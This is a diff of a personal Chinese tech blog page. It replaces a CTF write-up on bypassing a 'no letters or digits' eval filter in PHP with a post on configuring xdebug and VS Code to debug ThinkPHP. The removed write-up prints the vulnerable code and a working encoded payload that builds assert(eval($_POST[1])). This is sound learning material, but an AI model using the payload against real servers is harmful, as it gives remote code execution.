@@ -19,21 +19,21 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="题目: RCE ME123456789101112131415&lt;?phperror_reporting(E_ALL);if(isset($_GET[&#x27;code&#x27;]))&#123;    $code&#x3D;$_GET[&#x27;code&#x27;];    if(strlen($code)&gt;40)&#123;        die(&quot;This is too L">
+    <meta name="description" content="教训与启发有的时候做一件事就不能为了快速到达目的而盲目的横冲直撞 做了一个ctfshow西瓜杯tpdoor的题目,是thinkphp框架, 想要调试一下, 于是下载了xdebug, 但是怎么也调试不了, 然后直接照着别人的浏览器一个一个的试(现在想起来感觉好愚蠢),试到头晕眼花也没搞成. 从图书馆会宿舍的路上静下心来想了想, 把事情梳理了一遍, 觉得如果先学习一下xdebug调试php代码的原理说">
 <meta property="og:type" content="article">
-<meta property="og:title" content="无数字字母RCE">
-<meta property="og:url" content="http://mekrina.github.io/blogs/RCE/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Drce/index.html">
+<meta property="og:title" content="vscode调试thinkphp项目">
+<meta property="og:url" content="http://mekrina.github.io/blogs/windows/misc/vscode%E8%B0%83%E8%AF%95thinkphp%E9%A1%B9%E7%9B%AE/index.html">
 <meta property="og:site_name" content="mekrina">
-<meta property="og:description" content="题目: RCE ME123456789101112131415&lt;?phperror_reporting(E_ALL);if(isset($_GET[&#x27;code&#x27;]))&#123;    $code&#x3D;$_GET[&#x27;code&#x27;];    if(strlen($code)&gt;40)&#123;        die(&quot;This is too L">
+<meta property="og:description" content="教训与启发有的时候做一件事就不能为了快速到达目的而盲目的横冲直撞 做了一个ctfshow西瓜杯tpdoor的题目,是thinkphp框架, 想要调试一下, 于是下载了xdebug, 但是怎么也调试不了, 然后直接照着别人的浏览器一个一个的试(现在想起来感觉好愚蠢),试到头晕眼花也没搞成. 从图书馆会宿舍的路上静下心来想了想, 把事情梳理了一遍, 觉得如果先学习一下xdebug调试php代码的原理说">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-01-20T13:06:41.000Z">
-<meta property="article:modified_time" content="2025-03-08T04:14:37.430Z">
+<meta property="article:published_time" content="2025-03-20T13:06:41.000Z">
+<meta property="article:modified_time" content="2025-03-20T16:11:10.000Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>无数字字母RCE - mekrina</title>
+  <title>vscode调试thinkphp项目 - mekrina</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -199,7 +199,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="无数字字母RCE"></span>
+            <span id="subtitle" data-typed-text="vscode调试thinkphp项目"></span>
           
         </div>
 
@@ -210,8 +210,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-01-20 21:06" pubdate>
-          2025年1月20日 晚上
+        <time datetime="2025-03-20 21:06" pubdate>
+          2025年3月20日 晚上
         </time>
       </span>
     
@@ -222,7 +222,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          329 字
+          449 字
         
       </span>
     
@@ -233,7 +233,7 @@
         
         
         
-          3 分钟
+          4 分钟
         
       </span>
     
@@ -270,36 +270,23 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">无数字字母RCE</h1>
+            <h1 id="seo-header">vscode调试thinkphp项目</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="题目-RCE-ME"><a href="#题目-RCE-ME" class="headerlink" title="题目: RCE ME"></a>题目: <a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]RCE%20ME">RCE ME</a></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">40</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;This is too Long.&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO.&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/Br&gt;&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>).<span class="hljs-string">&quot;&lt;/Br&gt;&quot;</span>;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure>
-<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><ol>
-<li>字符串取反绕过</li>
-<li>字符串异或(同上)</li>
-</ol>
-<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?code<span class="hljs-operator">=</span>(~<span class="hljs-variable">%9</span>E<span class="hljs-variable">%8</span>C<span class="hljs-variable">%8</span>C<span class="hljs-variable">%9</span>A<span class="hljs-variable">%8</span>D<span class="hljs-variable">%8</span>B)(~<span class="hljs-variable">%9</span>A<span class="hljs-variable">%89</span><span class="hljs-variable">%9</span>E<span class="hljs-variable">%93</span><span class="hljs-variable">%D7</span><span class="hljs-variable">%DB</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%AF</span><span class="hljs-variable">%B0</span><span class="hljs-variable">%AC</span><span class="hljs-variable">%AB</span><span class="hljs-variable">%A4</span><span class="hljs-variable">%CE</span><span class="hljs-variable">%A2</span><span class="hljs-variable">%D6</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
-
-<p>第一个字符括号内的结果是<code>assert</code>,<br>第二个括号内结果是<code>eval($_POST[1])</code></p>
-<p>执行顺序是</p>
-<ol>
-<li>解析变量 得到 <code>assert</code> 和 <code>eval($_POST[1])</code></li>
-<li>调用eval,解析变量</li>
-<li>调用assert,执行代码</li>
-</ol>
-<h2 id="Q"><a href="#Q" class="headerlink" title="Q"></a>Q</h2><ol>
-<li><p>为什么不能直接构造<code>$_POST[1]</code>,而要加上<code>assert(eval(..))</code>?</p>
-<p> <strong>A:</strong><br> 直接构造<code>$_POST[1]</code>,执行的是</p>
- <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$_POST[1]&#x27;</span>);<br></code></pre></td></tr></table></figure>
-<p> 作用仅限于解析了POST变量1<br> 而不是所期望执行的</p>
- <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure>
-<p> 先取得变量,再执行代码.</p>
-</li>
-<li><p>为什么不能直接构造<code>eval($_POST[1])</code>?<br> <strong>A:</strong><br> 如果可以使用字母,直接传递<code>?code=eval($_POST[1]);</code>,可以达到效果,第一层eval获取了变量,第二层eval执行代码<br> 但是不能使用字母时,由于<strong>eval不是一个php函数,而是语言构造器,不能采用可变函数的方式调用</strong>,同样的,echo、include…也不行。详情见<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/functions.variable-functions.php">php可变函数</a></p>
-</li>
-</ol>
+                <h2 id="教训与启发"><a href="#教训与启发" class="headerlink" title="教训与启发"></a>教训与启发</h2><p>有的时候做一件事就不能为了快速到达目的而盲目的横冲直撞</p>
+<p>做了一个ctfshow西瓜杯tpdoor的题目,是thinkphp框架, 想要调试一下, 于是下载了xdebug, 但是怎么也调试不了, 然后直接照着别人的浏览器一个一个的试(现在想起来感觉好愚蠢),试到头晕眼花也没搞成.</p>
+<p>从图书馆会宿舍的路上静下心来想了想, 把事情梳理了一遍, 觉得如果先学习一下xdebug调试php代码的原理说不定事情就解决了,其实一点也不复杂.</p>
+<h2 id="vscode调试thinkphp项目"><a href="#vscode调试thinkphp项目" class="headerlink" title="vscode调试thinkphp项目"></a>vscode调试thinkphp项目</h2><p>朴素理解, 未必准确</p>
+<p>xdebug是php的扩展, 执行php代码的时候会被激活, 在断点处停下, 并从指定端口尝试连接IDE</p>
+<p>vscode中的phpdebug扩展, 监听launch.json中定义的端口, 接受xdebug传递的信息以进行调试</p>
+<p>因此配置好之后, 使用php think run运行php服务, 再F5监听端口即可.</p>
+<p>这里的调试和本机直接调试不同, 调试并不立即执行代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php.ini```文件(版本3.x适用)">```<br>[xdebug]<br>zend_extension=D:/phpstudy/phpstudy_pro/Extensions/php/php8.2.9nts/ext/php_xdebug.dll<br>xdebug.collect_params=1<br>xdebug.collect_return=1<br>xdebug.auto_trace=Off<br>xdebug.output_dir=&quot;D:/phpstudy/phpstudy_pro/Extensions/php_log/php8.2.9nts.xdebug.trace&quot;<br>xdebug.profiler_enable=Off<br>xdebug.remote_enable=Off<br>xdebug.client_host=localhost<br>xdebug.client_port=9003<br>xdebug.log=&quot;D:\xdebug_log&quot;<br>xdebug.mode = debug<br>xdebug.start_with_request=yes<br>xdebug.remote_handler=dbgp<br></code></pre></td></tr></table></figure>
+<p><code>launch.json</code></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0.2.0&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;configurations&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Debug ThinkPHP&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;php&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;request&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;launch&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">9003</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;pathMappings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;D:/code/test/tp/public&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;/public&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;D:/code/test/tp/app&quot;</span> <span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;/app&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+<p>当服务器与本地路径不一致时，需通过映射让 IDE 正确关联断点<br>(比如WSL中运行服务, IDE在主机上运行)</p>
 
                 
               </div>
@@ -318,7 +305,7 @@
     
       <span class="category-chain">
         
-  <a href="/blogs/categories/RCE/" class="category-chain-item">RCE</a>
+  <a href="/blogs/categories/windows/" class="category-chain-item">windows</a>
   
   
 
@@ -338,8 +325,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>无数字字母RCE</div>
-      <div>http://mekrina.github.io/blogs/RCE/无数字字母rce/</div>
+      <div>vscode调试thinkphp项目</div>
+      <div>http://mekrina.github.io/blogs/windows/misc/vscode调试thinkphp项目/</div>
     </div>
     <div class="license-meta">
       
@@ -351,7 +338,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年1月20日</div>
+          <div>2025年3月20日</div>
         </div>
       
       
@@ -383,15 +370,15 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/blogs/windows/misc/Rstudio%E9%81%BF%E5%9D%91%E6%8C%87%E5%8C%97/" title="Rstudio避坑指北">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Rstudio避坑指北</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/blogs/uncategorized/%E5%BE%85%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%96%87%E7%AB%A0/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
